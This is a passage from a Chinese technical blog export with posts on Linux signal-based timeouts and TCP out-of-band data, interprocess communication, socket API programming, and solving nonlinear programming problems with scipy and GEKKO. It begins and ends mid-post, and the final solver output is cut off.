超时控制模型在超时控制模型中，我们通过等待一个预设定的时间后产生SIGALRM信号，信号将会被之前设定的信号接受函数进行处理，选择重发或者跳过相关逻辑。1234567891011121314//定义信号处理函数void sigalarm_handler()&#123; ......&#125;//注册信号处理函数struct sigaction act;act.sa_handler=sigalarm_handler;act.sa_flags=0;sigaction(SIGALRM,&amp;act,NULL);//在需要计时的地方调用alarm(time),如sendto(......)alarm(5)//等待5秒...... 带外数据模型带外数据模型是一种处理紧急套接字数据的方式，带外数据拥有比一般数据高的优先级。其具有以下几个特性。 TCP没有独立的带外数据通道，而是通过“紧急方式（urgent mode）”将紧急数据插入正常数据流中进行传送。通过URG标志表明数据流中存在带外数据，通过紧急指针指向紧急数据的位置（一个正的偏移量）。 需要注意的是套接字支持的带外数据只有一个字节，超过一个字节会将最后一个字节偏移作为紧急指针位置，前面的字节作为正常数据传输。 当由紧急指针指向的实际带外数据到达接收端TCP时，系统根据SO_OOBINLINE套接字选项设置与否将该带外数据放入不同缓冲区：未设置SO_OOBINLINE选项（缺省）：默认情况下带外数据被放入独立的（单字节）带外数据缓冲区中。设置了SO_OOBINLINE选项：带外数据被放入正常套接字缓冲区中（inline）进程使用普通接收函数进行读取，比如read或recv，不能指定MSG_OOB标志，否则出错；读取带外数据之前应先判断下一字节是否为带外数据（如 sock_at_mark函数）。但是一般情况下我们不会把带外数据与正常的数据流混在一起。而是通过设置自定义的信号来捕获URG标志随带的信号 涉及到的接受发送带外数据函数如下：123456789101112send(sockfd,msg,1,MSG_OOB);recv(sockfd,rec_buff,BUFSIZE,MSG_OOB);//当带外数据与正常数据一同存放的时候，需要设置判断函数，其实现过程如下：int sock_at_mark(int fd)&#123; int flag; if( ioctl(fd,SIOCATMARK,&amp;flag) &lt; 0) return -1; return (flag!=0?1:0);&#125; 带外数据模型的流程如下：1234567891011121314151617181920客户端在需要发送带外数据的时候调用：send(sockfd,msg,1,MSG_OOB);服务端基于信号(SIGURG)触发的带外数据处理流程：//设置信号触发处理函数void signal_urg(int signo)&#123; ... recv(connfd,buf,sizeof(buf)-1,MSG_OOB); ...&#125;void *old_signal_urg_handle;//保存以前的信号处理old_signal_urg_handle=signal(SIGURG,signal_urg);//更改套接字属主，因为SIGURG信号只会发送给套接字属主fcntl(socket,F_SETOWN,getpid())//下面是正常的socket流程......//处理完后记得将SIGURG信号还原signal(old_signali_urg_handle,SIGURG);......]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux 进程间通信]]></title>
    <url>%2F2018%2F12%2F11%2Flinux-%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%2F</url>
    <content type="text"><![CDATA[进程间通信（InterProcess Communication，IPC）是指在不同进程之间传播或交互信息；进程的用户空间是相互独立的，一般而言是无法互相访问的。但是很多时候我们需要进程间的通信机制来丰富程序的内容，所以操作系统为我们提供了进程间通信的一系列系统调用。常用的进程间通信的手段有：管道以及命名管道，消息队列，信号与信号量，共享内存，套接字（包括本机域套接字）。当然广义上来说还包括一些磁盘I/O，以及外设等。注意明确一个概念：信号与信号量是不同的机制。信号（signal）是一种处理异步事件的方法，它是由硬件或软件触发，再由操作系统内核发送给应用程序的中断形式；信号灯（semaphore）是一种实现进程间同步、互斥的机制，是一种数据操作锁的概念。 无名管道管道使数据以一种数据流的方式在进程间流动，相当于文件系统中的一个文件，来缓存所要传输的数据由于是匿名，无法在文件系统中以任何方式看到该管道，它只是进程的一种资源，会随着进程的结束而被系统清除。无名管道具有以下特点： 半双工，数据流向具有单向性，一个进程向管道中写的内容被管道另一端的进程读出。双向通信需要建立两个管道 只能用于父子进程或者兄弟进程之间（具有血缘关系的进程）； 管道对于两端的进程来说就是一个文件，但不是普通文件，它只存在于内存中； 管道的缓冲区是有限的，在管道创建时，为缓冲区分配一个页面大小的空间（默认为4k字节）； 传送的是无格式字节流，要求管道的读出方和写入方必须事先约定好数据的格式 1234int pipe(int fd[2]); 参数：fd－用于通信的一对文件描述符，fd[0]用于读，fd[1]用于写返回值：0－成功，-1－失败 注意到无名管道不是全双工的，所以当需要两个进程互传消息的时候，需要使用两个pipe。 命名管道命名管道，即named pipe，也称为FIFO，与管道不同之处在于提供一个路径名与之关联，以FIFO文件形式存在于文件系统中；即使与FIFO创建进程无亲缘关系的进程，只要能访问该路径，就能够通过FIFO相互通信；由于它作为一种特殊的文件存放于文件系统中，而不是像管道一样存放于内存（使用完毕后消失），当使用结束后，命名管道依然存在于文件系统中，除非将其删除；FIFO严格遵循先入先出的规则，读总是从开始处返回数据，写则把数据添加到末尾，不支持lseek等文件定位操作 使用命名管道的操作与使用普通文件类似； 用open函数打开一个命名管道； 用read和write函数对命名管道进行读写； 用close函数关闭一个命名管道； 如要删除一个命名管道，则使用unlink函数 1234567int mkfifo(char *pathname, mode_t mode);参数：pathname－管道名称，绝对路径名mode－打开文件的模式返回值0－成功，-1－失败如果第一个参数是一个已经存在的路径名时，则返回EEXIST错误，如果返回该错误，只要调用打开FIFO的函数就可以了 消息队列消息队列是一种以链表式结构组织的一组数据，存放于内核中，是由各进程通过消息队列标识符来引用的一种数据传送方式；可以把消息看成一个记录，具有特定的格式，对消息队列有写权限的进程可以向其中按照一定的规则添加新消息，对消息队列有读权限的进程则可以从消息队列中读走消息；每个消息队列都在系统范围内对应一个唯一的键值，消息队列的标识符（ID）就是由该键值生成的，而键值对应了系统内的一条路径。ftok函数能够由路径获得消息队列的键值； 123456789101112131415161718192021222324key_t ftok(char *pathname, char proj_id);功能：获得特定文件路径名的键值参数：pathname－指定的文件（路径）名proj_id－子序号返回值成功时返回与路径pathname相对应的一个键值（通常与指定文件的索引节点号相关），失败则返回-1int msgget(key_t key, int flags);功能：创建消息队列参数：key－由ftok函数获得的键值，或指定为IPC_PRIVATE，由系统分配flags－标志位，类似于打开和创建文件时的参数返回值消息队列的引用标识符ID－成功，-1－失败关于消息队列的收发和参数控制int msgsnd(int msqid, struct msgbuf *buf, int nbytes, int flags);int msgrcv(int msqid, struct msgbuf *msgp, int nbytes, long mtype, int flags);int msgctl(int msqid, int cmd, struct msqid_ds *buf); 共享内存共享内存是Linux下最快速、最有效的进程间通信方式，只需拷贝两次数据：一次从应用输入到共享内存区，另一次从共享内存区到应用输出，而且会保持映射直到通信结束。(注意到前面的消息队列以及管道都需要copy四次数据：输入-&gt;发送方缓冲区-&gt;内核缓冲区-&gt;接收方缓冲区-&gt;输出。）最大不足：由于多个进程对同一块内存区域具有访问的权限，进程间同步问题突出。123456789创建共享内存段：int shmget(key_t key, int size, int flags);将共享内存段映射到进程虚拟地址空间：char *shmat(int segid, char *addr, int flags);返回共享内存段在进程虚拟地址空间的首地址解除共享内存段的映射：int shmdt(char *addr);共享内存段控制：int shmctl(int segid, int cmd, struct shmid_ds *sbuf); 信号量信号量是一种数据操作锁的概念，本身不具备数据交换的功能，而是通过控制其他的通信资源（比如文件、外设等）来实现进程间通信，是一种外部资源的标识；抽象的讲，信号灯是一个非负整数，所有通过它的进程/线程都会将该整数减1，当该整数为零时，所有试图通过它的进程都将处于等待状态；定义两种操作：wait（等待）和release（释放）。类似于操作系统中的P、V操作。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162创建：int semget(key_t key, int nsems, int flags);操作：int semop(int semid, struct sembuf *ops, size_t nops);控制：int semctl(int semid, int semnum, int cmd, union semun arg);例子：//创建信号量int sem_id;sem_id = semget((key_t)1234, 1, 0666 | IPC_CREAT);static int set_semvalue(sem_id)&#123; //用于初始化信号量，在使用信号量前必须这样做 union semun sem_union; sem_union.val = 1; if(semctl(sem_id, 0, SETVAL, sem_union) == -1) return 0; return 1;&#125;static void del_semvalue(sem_id)&#123; //删除信号量 union semun sem_union; if(semctl(sem_id, 0, IPC_RMID, sem_union) == -1) fprintf(stderr, "Failed to delete semaphore\n");&#125;static int semaphore_p(sem_id)&#123; //对信号量做减1操作，即等待P（sv） struct sembuf sem_b; sem_b.sem_num = 0; sem_b.sem_op = -1;//P() sem_b.sem_flg = SEM_UNDO; if(semop(sem_id, &amp;sem_b, 1) == -1) &#123; fprintf(stderr, "semaphore_p failed\n"); return 0; &#125; return 1;&#125;static int semaphore_v()&#123; //这是一个释放操作，它使信号量变为可用，即发送信号V（sv） struct sembuf sem_b; sem_b.sem_num = 0; sem_b.sem_op = 1;//V() sem_b.sem_flg = SEM_UNDO; if(semop(sem_id, &amp;sem_b, 1) == -1) &#123; fprintf(stderr, "semaphore_v failed\n"); return 0; &#125; return 1;&#125; unix 域套接字UNIX域套接字比Internet套接字效率更高。因为其只需要处理本机进程通信，少去了传输层及以下的封装，同时由于进程都有操作系统内核管理，更好的流量控制。unix套接字分为非命名和命名两种。命名套接字的操作跟普通的socket操作一致。而非命名套接字的机制就类似无名管道，不同是，linux 域套接字是全双工的。 命名unix 域套接字12345#include &lt;sys/un.h&gt;struct socketaddr_un &#123; short int sun_family; //AF_UNIX char sun_path[108]; //文件名的绝对路径 &#125;； 注意到命名unix域套接字使用sun_path唯一标识服务端，与网络socket通过ip和端口进行标识是由一定的不同。 非命名unix 域套接字socket是无名的；通信前不需要经过地址绑定、建立连接过程，与pipe相似；socket是全双工的，而pipe创建的是单向信道。12345678int socketpair(int family, int type, int protocol, int fd[2]);创建两个UNIX域socket，并连接在一起参数：family－AF_UNIXtype－SOCK_STREAM或SOCK_DGRAMprotocol－0fd－创建的两个套接字句柄存在socket[0]/[1]返回值：0－成功，-1－失败]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux socket 编程]]></title>
    <url>%2F2018%2F12%2F11%2Flinux-socket-%E7%BC%96%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[套接字编程大致可以分为以下三种：流式套接字(stream)，数据报式套接字(datagram)以及原生套接字（row）。其中用得比较多的式流式套接字和数据报套接字。下面主要对所学的Linux下的socket编程进行学习记录。 基于TCP的socket编程 TCP服务器通常采用并发服务器模型 以下函数依赖的头文件汇总1234567#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;unistd.h&gt;#include &lt;errno.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; 套接字的创建123456789101112131415161718int socket (int family, int type, int protocol)功能：创建socket参数：（P34表2-1描述了可能的参数值）family（协议簇）：AF_INET、AF_UNIX等type（类型）：SOCK_STREAM、SOCK_DGRAM、SOCK_RAWprotocol（协议）：默认为0返回值：&gt;0－socket描述符， -1－失败， 系统全局变量errno为错误代码（strerror函数显示描述字符串）int sockfd=socket(AF_INET, SOCK_STREAM, 0);if(sockfd==-1)&#123; printf(“can not create socket\n"); exit(1);&#125;… 可以注意到，这个函数其实是在本地创建一个socket 文件描述符，因为在linux下一切兼文件。所以对套接字的操作抽象为对文件描述符的操作，这样我们可以方便使用read(),write()操作对socket进行读写。当然使用socket 系列函数也是可以的。 sockaddr 结构体的赋值123456789101112131415161718192021222324sockaddr 结构体：#include &lt;netinet/in.h&gt;#include &lt;sys/socket.h&gt;struct sockaddr_in &#123; short sin_family; /*AF_INET*/ u_short sin_port; /*端口号，网络字节序*/ struct in_addr sin_addr; /*IP地址，网络字节序*/ char sin_zero[8]; /*填充字节，必须为全零*/&#125;;struct in_addr &#123; u_long s_addr;&#125;;使用举例：struct sockaddr_in srvaddr;bzero(&amp;srvaddr, sizeof(srvaddr));srvaddr.sin_family = AF_INET;srvaddr.sin_port = htons(srvport);srvaddr.sin_addr.s_addr=htonl(INADDR_ANY);… 注意到sockaddr 结构体中的sin_port 字段和 sin_addr 字段需要转换为网络字节序，因为不同的系统上面对数字的存储有大端存储和小端存储两个方式，在进行socket编程的时候需要规范化。规范的方式就是调用htons(),htonl()函数。或者使用以下两个函数。123456789101112int inet_aton (const char *cp, struct in_addr *inp);将点分IP地址格式转换为无符号整型char* inet_ntoa (struct in_addr in);将无符号整型转换为点分格式举例：//点分字符串格式地址转换为无符号整型struct sockaddr_in addr;inet_aton(“219.245.78.159”,&amp;addr.sin_addr);//无符号整型转换为点分字符串格式printf(“%s”,inet_ntoa(addr.sin_addr)); 绑定套接字描述符与sockaddr 结构体123456789101112131415161718int bind (int sockfd, struct sockaddr *myaddr, int addrlen); 功能：将地址与所创建的套接字进行关联参数：sockfd－socket描述符myaddr－自己的地址addrlen－地址结构长度（如何表示？）返回值：0－成功，-1－失败，errno为错误代码 if( bind(sockfd, (struct sockaddr *)&amp;srvaddr, sizeof(struct sockaddr) )==-1)&#123; printf("bind error\n"); close(sockfd); exit(1); &#125;… 监听端口1234567891011121314151617int listen (int sockfd, int backlog)功能：建立一个连接请求等待队列，监听本地地址和端口参数：sockfd－已绑定的socket描述符backlog－连接请求队列长度（门限值），当连接请求到达时，被插入请求队列，以避免由于服务器忙而将请求拒绝返回值0－成功，-1－失败，errno为错误代码 // 监听端口示例：if( listen(sockfd, BACKLOG) ==-1)&#123; printf("listen error\n"); close(sockfd); exit(1); &#125;… 执行listen后socket转换成被动socket，可以接受连接；listen()函数只能用在在TCP面向连接方式下的socket，比如SOCK_STREAM，面向无连接的方式，一般没有listen这个操作，后面会看到；当一个连接请求到达时，被插入请求队列，服务器用accept()函数从队列中移走并响应请求。 客户端链接服务器123456789101112131415161718int connect (int sockfd, struct sockaddr *servaddr, int addrlen)功能：连接服务器参数：sockfd－socket描述符servaddr－服务器地址addrlen－地址结构长度返回值：0－成功，-1－失败，errno为错误代码//连接服务器，调用前需要对srvaddr进行初始化If (connect(sockfd, (struct sockaddr *)&amp;srvaddr, sizeof(struct sockaddr))==-1)&#123; printf("connect error\n"); close(sockfd); exit(1); &#125; 注意到一般客户端不指定自己的端口号，而是由操作系统分配给我们一个空闲的临时端口。 服务端接受客户端链接1234567891011121314151617181920int accept (int sockfd, struct sockaddr *clientaddr, int *addrlen);功能：接受连接参数：sockfd－socket描述符clientaddr－客户端地址addrlen－地址结构长度返回值&gt;0－成功，返回新的socket描述符标识已接受的连接-1－失败，errno为错误代码int sin_size=sizeof(struct sockaddr_in); int new_fd=accept(sockfd, (struct sockaddr *)&amp;clientaddr, &amp;sin_size) ; If (new_fd==-1)&#123; printf("accept error\n"); continue; &#125;… 注意到accept函数在无连接请求时将阻塞进程，当然我们也可以使用非阻塞式IO模型进行编程，后面会看到。 接收数据1234567891011121314int read (int fd, char *buf, int len);功能：从socket读取数据参数：fd－socket描述符buf－接收数据缓冲区len－要读取数据大小返回值n无数据 阻塞套接字缓冲区&gt;=len 读出len个字节n&gt;0 and n&lt;len 读出n个字节n=0 读通道已关闭n&lt;0 出错或异常，errno为错误代码n=-1,EINTR 由中断引起错误n=-1,ECONNREST 网络连接有问题 read并不是从网络读取数据，而只是完成从套接字接收缓冲区到接收进程应用缓冲区复制数据的任务。同时注意到，这是个系统调用，跨越了用户态和内核态。 发送数据1234567891011121314int write (int fd, char *buf, int len);功能：向socket发送数据参数：fd－socket描述符buf－发送数据缓冲区len－要发送数据大小返回值n无缓冲区 阻塞套接字缓冲区&gt;=len 写入len个字节n&gt;0 and n&lt;len 写入n个字节n=0 写通道已关闭n&lt;0 出错或异常，errno为错误代码n=-1,EINTR 由中断引起错误n=-1,EPIPE 网络连接有问题 同read()函数一样，write函数成功返回并不意味着数据已经通过网络发送到对方主机，而只是说明已存放在套接字发送缓冲区中，等待TCP协议来发送。 关闭socket123456789101112131415161718int close (int sockfd)功能：关闭socket参数：sockfd－socket描述符返回值0－成功，-1－失败，errno为错误代码int shutdown(int sockfd,int howto); 功能：关闭连接参数：sockfd－socket描述符howto－指定关闭操作的类型0：停止读1：停止写2：停止读、写返回值：0－成功，－1失败 这两个函数名义上都是关闭套接字，但是其功能很不一样。调用close后本进程将不能再使用这个套接字描述符，但TCP可能并没有删除套接字结构，因为可能其他进程还在使用它；调用close只是将对sockfd的引用减1，直到对sockfd的引用为0时才清除sockfd。而使用shutdown 的方式可以按照howto指定的关闭手段对socket进行按需关闭，这是真正意义上的关闭，一旦调用了shutdown,所有进程都不能再使用套接字的相关功能。 基于UDP的socket编程根据UDP协议，我们可以概括UDPsocket套接字编程的特点： 非面向连接，不需事先建立连接； 主要通过sendto和recvfrom函数来完成数据交互； sendto函数不会产生IO阻塞，但是recvfrom函数会。客户机可能因为数据丢失永远阻塞在recvfrom函数处。 UDP服务器通常采用循环服务器（重复型）的工作方式，不会被某一个客户独占 通常需要一些错误处理逻辑，诸如乱序，丢失，流量控制等等 sendto/send123456789101112131415161718int send(int fd,char *buf,int len,int flags);int sendto(int fd,char *buf,int len,int flags,struct sockaddr *toaddr, int addrlen)功能：向套接字发送数据返回值：≥0—成功，-1—失败参数：fd－socket描述符buf－数据缓冲区len－缓冲区字节数toaddr—目的套接字地址addrlen—地址长度flags－控制参数flags=0, send与write功能相同flags=MSG_DONTROUTE，告诉内核，目标主机在本地网络，无需查找路由表。适用于局域网，或同一网段flags=MSG_OOB，发送带外数据flags=MSG_DONTWAIT，如果套接字缓冲区没有足够空间，则进程不阻塞等待 recvfrom/recv123456789101112131415161718192021int recv(int fd,char *buf,int len,int flags);int recvfrom(int fd,char *buf,int len,int flags,struct sockaddr *fromaddr, int *addrlen)功能：从套接字读取数据返回值：≥0—成功，-1—失败参数：fd－socket描述符buf－数据缓冲区len－缓冲区字节数fromaddr—源套接字地址addrlen—地址长度flags－控制参数控制参数说明flags=0, recv与read功能相同flags=MSG_OOB，接收带外数据flags=MSG_DONTWAIT，套接字缓冲区没有数据时，进程不阻塞等待flags=MSG_WAITALL，通知内核直到读到请求的数据字节数时，才返回flags=MSG_PEEK，接收数据时不从缓冲区移走数据，下一个读操作将会读到同样的数据…… 注意到UDP式面向无连接的socket,在使用recvfrom的时候，还有另外一种写法。若需要知道发送方的地址，则可以在recvfrom函数中初始化参数fromaddr和addrlen由内核来填充；如果不关心发送方的地址，则可以将recvfrom函数的参数fromaddr和addrlen都设置为NULL；recvfrom(sockfd,buf,len,0,NULL,NULL) UDP假connect1234567891011int connect (int sockfd, struct sockaddr *servaddr, int addrlen)调用方法与流式套接字相同，但调用结果不同；无三次握手过程，且并未建立连接；UDP使用连接函数后，发送数据可以不用指定地址；且只接收所建立连接的对方数据报，底层socket的接受缓冲区只接受目的地址为connect之前指定的；意外情况处理服务器缓冲区满：丢弃数据包，且不返回错误服务器未运行对应进程：服务器向客户机返回错误信息—ECONNRESET数据未成功到达：目的地不可达—路由器返回错误消息；字节错误或缓冲区满—不返回任何信息连接套接字取消再次调用connect函数 socket 其他函数sendmsg&amp;recvmsg123456789int sendmsg(int fd,struct msghdr *msgp,int flags);int recvmsg(int fd,struct msghdr *msgp,int flags);功能：发送和接收规格化的数据，配对使用返回值：≥0—成功，-1—失败参数：fd－socket描述符msghdr－规格化数据缓冲区flags－控制参数c readv&amp;writev123456789readv和writevssize_t readv(int fd,const struct iovec iov[],int iovcnt);ssize_t writev(int fd,const struct iovec iov[],int iovcnt);功能：一次读、写多个非连续缓冲区返回值：≥0—成功，已读写字节数；-1—失败参数：fd－socket描述符iov－缓冲区数组iovcnt－缓冲区数组个数 getpeername1234567int getpeername(int fd,struct sockaddr *proaddr,int *addrlen);功能：获得对端socket的地址信息参数：fd－socket描述符proaddr－存放地址信息的缓冲区的指针addrlen－存放缓冲区字节数的整型变量的指针返回值：0－成功，－1失败 当一个调用accept的进程通过fork和exec启动一个新的进程时，经常要调用这个函数；新的服务器通过getpeername函数来得到远端的地址。 getsockname12345678getsocknameint getsockname(int fd,struct sockaddr *proaddr,int *addrlen);功能：获得本地socket的地址信息参数：fd－socket描述符proaddr－存放地址信息的缓冲区的指针addrlen－存放缓冲区字节数的整型变量的指针返回值：0－成功，－1失败 获取/设置 socket参数1234567891011121314151617181920212223242526272829303132int getsockopt(int sockfd, int level, int optname, void *optval, sock_len_t *optlen);int setsockopt(int sockfd, int level, int optname, void *optval, sock_len_t optlen);功能：获取或设置socket选项返回值：0－成功，-1失败参数：sockfd－socket描述符level－选项级别optname—选项名称optval—选项值指针 optlen—选项值的长度/存放选项值长度的指针 参数level 代表欲设置的网络层, 一般设成SOL_SOCKET 以存取socket 层. 参数optname 代表欲设置的选项, 有下列几种数值: SO_DEBUG 打开或关闭排错模式 SO_REUSEADDR 允许在bind ()过程中本地地址可重复使用 SO_TYPE 返回socket 形态. SO_ERROR 返回socket 已发生的错误原因 SO_DONTROUTE 送出的数据包不要利用路由设备来传输. SO_BROADCAST 使用广播方式传送 SO_SNDBUF 设置送出的暂存区大小 SO_RCVBUF 设置接收的暂存区大小 SO_KEEPALIVE 定期确定连线是否已终止. SO_OOBINLINE 当接收到OOB 数据时会马上送至标准输入设备 SO_LINGER 确保数据安全且可靠的传送出去.下面给出一个预创建子进程的时候的参数设置样例：int n=1;setsockopt(sockfd,SOL_SOCKET,SO_REUSEADDR,&amp;n,sizeof(n)); fcntl1234567891011int fcntl(int fd,int cmd,…)功能：改变套接字属性设置socket为阻塞/非阻塞模式设置允许/不允许接收异步I/O信号设置/获取socket的所有者参数：fd－文件（socket）描述符cmd－执行的操作其他参数－根据cmd选择适当参数返回值：≥0－成功，-1－失败 ioctl123456789101112131415int ioctl(int fd,int req,…);功能：控制输入输出参数：fd－文件（socket）描述符req－执行的操作类型第三个参数－总是指针类型，存储操作返回的数据或操作所需的数据返回值：0－成功，-1－失败req 参数常用如下：SIOCATMARK 检测是否到达带外标记FIONBIO 非阻塞模式FIOASYNC 异步输入/输出标志SIOCSPGRP/ 设置/获取目标进程或进程组SIOCGPGRPFIONREAD 缓冲区中有多少字节可读 多路复用函数select12345678910111213141516171819202122232425262728293031int select(int maxfd,fd_set *rdset,fd_set *wrest,fd_set *exset,struct timeval *timeout);功能：检查多个文件描述符（socket描述符）是否就绪，当某一个描述符就绪（可读、可写或发生异常）时函数返回，可以实现输入输出多路复用返回值：有描述符就绪则返回就绪的描述符个数；超时时间内没有描述符就绪返回0；执行失败返回 -1。参数：maxfd－集合中所有描述符的最大值+1 rdset－需要测试是否可读的描述符集合（包括处于listen状态的socket接收到连接请求） wrset－需要测试是否可写的描述符集合（包括以非阻塞方式调用connect是否成功） exset－需要测试是否异常的描述符集合（包括接收带外数据的socket有带外数据到达） timeout－指定测试超时的时间 select函数监控的socket接口状态读：有数据可读连接的读通道被关闭listen的套接字已经将连接排队socket差错未处理写：缓存可供写操作使用连接的写通道被关闭socket差错未处理例外：OOB同步标记未处理描述符集合操作函数FD_ZERO(fd_set *fdset)－清空描述符集合FD_SET(int fd,fd_set *fdset)－将一个描述符添加到描述符集合 FD_CLR(int fd,fd_set *fdset)－将一个描述符从描述符集合中清除 FD_ISSET(int fd,fd_set *fdset)－检测一个描述符是否就绪注：在设置描述符集合前应该先调用FD_ZERO将集合清空，每次调用select函数前应该重新设置读、写和错误3个集合；三个集合中的描述符可以交叉 域名相关函数12345678910111213141516171819202122#gethostbynameinclude &lt;netdb.h&gt;struct hostent* gethostbyname(const char *name)功能：查询域名对应的IP#gethostbyaddrinclude &lt;netdb.h&gt;struct hostent *gethostbyaddr(const char *addr,size_t len,int family); 功能：查询IP对应的域名查询失败时错误类型保存在全局变量h_errno中，hstrerror可以得到h_errno的描述信息struct hostent&#123; char *h_name; /*主机正式名称*/ char **h_aliases; /*别名列表，以NULL结束*/ int h_addrtype; /*主机地址类型：AF_INET*/ int h_length; /*主机地址长度：4字节32位*/ char **h_addr_list; /*主机ip地址列表，以NULL结束*/&#125;]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数模之非线性规划]]></title>
    <url>%2F2018%2F12%2F09%2F%E6%95%B0%E6%A8%A1%E4%B9%8B%E9%9D%9E%E7%BA%BF%E6%80%A7%E8%A7%84%E5%88%92%2F</url>
    <content type="text"><![CDATA[前面有提到使用python做线性规划问题，有一些第三方库可以让我们快速上手，对线性规划的模型进行求解。无论是整数形线性规划还是连续形，都可以找到实用的库。但是在线性规划问题中还存在一种非线性的问题。其约束条件不是简单的呈现线性的关系，前面我们提到的两个库就不再实用，这时就要继续发现新大陆，于是就有了这篇文章。 非线性规划问题首先对什么是非线性规划是什么有个感性的认识：如果目标函数或约束条件中包含非线性函数，就称这种规划问题为非线性规划问题。一般说来，解非线性规划要比解线性规划问题困难得多。而且，也不象线性规划有 单纯形法这一通用方法，非线性规划目前还没有适于各种问题的一般算法，各个方法都 有自己特定的适用范围。当然我们伟大的前人已经研究了一些算法可以求出局部最优解，或者在特定的条件下可以推出局部最优就是全局最优。或者我们可以通过类似机器学习算法里面的多次赋初始值梯度下降求局部最优，然后从不同的下降路线中找到尝试的过的最优解，这时往往可以到达全局最优，这取决于我们迭代的次数。既然前人有了一些不错的算法，那么自然就有一些前辈做出一些自动化的工具，来极大的提高生产力。所以经过一番搜索，我发现了以下两个不错的求解非线性规划问题的库。当然这也许不是最好的，但是就笔者而言，一定是最简单易用的。 scipy optimize minimize解决方案以一个网上找的现成例子为例：计算 (2+x1)/(1+x2) - 3x1+4x3 的最小值？（x1,x2,x3的范围都在0.1到0.9 之间） 12345678910111213141516171819202122232425262728293031323334from scipy.optimize import minimizeimport numpy as np # demo 2#计算 (2+x1)/(1+x2) - 3*x1+4*x3 的最小值 x1,x2,x3的范围都在0.1到0.9 之间def fun(args): a,b,c,d=args v=lambda x: (a+x[0])/(b+x[1]) -c*x[0]+d*x[2] return vdef con(args): # 约束条件 分为eq 和ineq #eq表示 函数结果等于0 ； ineq 表示 表达式大于等于0 x1min, x1max, x2min, x2max,x3min,x3max = args cons = (&#123;'type': 'ineq', 'fun': lambda x: x[0] - x1min&#125;,\ &#123;'type': 'ineq', 'fun': lambda x: -x[0] + x1max&#125;,\ &#123;'type': 'ineq', 'fun': lambda x: x[1] - x2min&#125;,\ &#123;'type': 'ineq', 'fun': lambda x: -x[1] + x2max&#125;,\ &#123;'type': 'ineq', 'fun': lambda x: x[2] - x3min&#125;,\ &#123;'type': 'ineq', 'fun': lambda x: -x[2] + x3max&#125;) return cons if __name__ == "__main__": #定义常量值 args = (2,1,3,4) #a,b,c,d #设置参数范围/约束条件 args1 = (0.1,0.9,0.1, 0.9,0.1,0.9) #x1min, x1max, x2min, x2max cons = con(args1) #设置初始猜测值 x0 = np.asarray((0.5,0.5,0.5)) res = minimize(fun(args), x0, method='SLSQP',constraints=cons) print(res.fun) print(res.success) print(res.x) -0.773684210526435 True [0.9 0.9 0.1] 在这个示例中，我们可以看到scipy.optimize.minimize（）函数需要我们传入一个目标函数（示例中是函数fun()），其返回值是一个lambda匿名函数对象，其内容就是我们需要求解的目标式，需要注意的是，这个传入的函数里面的常量需要以元祖的形式传入，也就是说，在函数内部不应该出现常量。第二个参数是对内部变量的初始化值，注意到我们之前提到的，这个初始化值一定程度上可以影响到最终解。然后就是methon参数，这个参数指定我们使用的优化算法。这里推荐使用SLSQP。然后constraints参数，其与目标函数的传入一样，需要传入一个函数，其具体的构造方式可以参看示例代码，注释已经说明的相当清楚。 GEKKO解决策略当然除了万能的scipy之外，还有一些专门做优化的python库可以提供帮助，这里着重推荐GEKKO。这是APMonitor的全新接口。这个库很神奇，是一个C/S结构的，类似于tensorflow,需要在python脚本外运行方程（在tensorflow中将图构造好，让外部运行图的计算），这个外部甚至可以是远程服务器，在没有下载本地server的情况下，默认就是使用的远程服务器提供的APM的API，只不过GEKKO帮我们把构造方程这些步骤做了封装。也隐藏了向服务端发送请求和接受请求的步骤。所以我们需要关心的就是如何通过GEKKO构造我们规划模型。很多细节可以直接通过参考文献[1]的官网进行了解。这里就大致说一下GEKKO的使用。 下面以著名的非线性HS 71 Benchmark问题的官方求解为例子： 12345678910111213141516171819202122232425262728293031323334353637from gekko import GEKKO#Initialize Modelm = GEKKO()#define parametereq = m.Param(value=40)#initialize variablesx1,x2,x3,x4 = [m.Var(lb=1, ub=5) for i in range(4)]#initial valuesx1.value = 1x2.value = 5x3.value = 5x4.value = 1#Equationsm.Equation(x1*x2*x3*x4&gt;=25)m.Equation(x1**2+x2**2+x3**2+x4**2==eq)#Objectivem.Obj(x1*x4*(x1+x2+x3)+x3)#Set global optionsm.options.IMODE = 3 #steady state optimization#Solve simulationm.solve()#Resultsprint('')print('Results')print('x1: ' + str(x1.value))print('x2: ' + str(x2.value))print('x3: ' + str(x3.value))print('x4: ' + str(x4.value)) apm 113.140.11.125_gk_model2 &lt;br&gt;&lt;pre&gt; ---------------------------------------------------------------- APMonitor, Version 0.8.5 APMonitor Optimization Suite ---------------------------------------------------------------- --------- APM Model Size ------------ Each time step contains Objects : 0 Constants : 0 Variables : 6 Intermediates: 0 Connections : 0 Equations : 3 Residuals : 3 Number of state variables: 5 Number of total equations: - 2 Number of slack variables: - 1 --------------------------------------- Degrees of freedom : 2 ********************************************** Steady State Optimization with Interior Point Solver ********************************************** Info: Exact Hessian ****************************************************************************** This program contains Ipopt, a library for large-scale nonlinear optimization. Ipopt is released as open source code under the Eclipse Public License (EPL). For more information visit http://projects.coin-or.org/Ipopt ****************************************************************************** This is Ipopt version 3.12.10, running with linear solver ma57. Number of nonzeros in equality constraint Jacobian...: 9 Number of nonzeros in inequality constraint Jacobian.: 0 Number of nonzeros in Lagrangian Hessian.............: 10 Total number of variables............................: 5 variables with only lower bounds: 1 variables with lower and upper bounds: 4 variables with only upper bounds: 0 Total number of equality constraints.................: 2 Total number of inequality constraints...............: 0 inequality constraints with only lower bounds: 0 inequality constraints with lower and upper bounds: 0 inequality constraints with only upper bounds: 0 iter objective inf_pr inf_du lg(mu) ||d|| lg(rg) alpha_du alpha_pr ls 0 1.6109693e+01 1.12e+01 2.50e+00 0.0 0.00e+00 - 0.00e+00 0.00e+00 0 1 1.6905655e+01 7.44e-01 5.14e-01 -0.9 1.36e-01 - 1.00e+00 1.00e+00f 1 2 1.7136202e+01 